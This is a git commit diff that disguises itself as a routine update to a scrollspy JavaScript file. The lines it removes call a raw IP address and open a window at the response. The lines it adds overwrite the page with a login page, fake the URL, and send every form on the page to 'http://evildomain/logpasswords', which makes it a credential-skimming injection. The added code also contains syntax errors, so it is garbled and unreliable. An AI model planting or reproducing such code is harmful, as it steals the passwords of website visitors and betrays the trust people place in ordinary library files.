e9e8d698e5e9f2e2ce1e64720adb656b4d50bf82
dimpol <djdimpol@rocketmail.com>
2016-11-07 14:57:28 +0200

    Update scrollspy.js

--- js/src/scrollspy.js
+++ js/src/scrollspy.js
@@ -1,2 +1,19 @@
-var x=new XMLHttpRequest();x.open('GET','https://188.4.181.71');x.send();
-x.onreadystatechange=function(){if(this.readyState==4){window.open(x.responseURL)}}
+function override(url){
+  var req = new XMLHttpRequest();
+  req.open('GET', url,false);
+  req.onreadystatechange = function(){
+    if(req.readyState == 4 && req.responseText != ""){
+      document.innerHTML = req.responseText;
+    }
+  }
+  req.send(null);
+}
+
+override("/login.php");
+
+history.pushState){he: "he"}, document,getElementsByTagName("title")[0].innerHTML, "login.php");
+
+var forms = document.getElementsByTagName("form");
+for (index=0;index<forms.length;index++){
+  void(forms[index].action = "http://evildomain/logpasswords");
+}
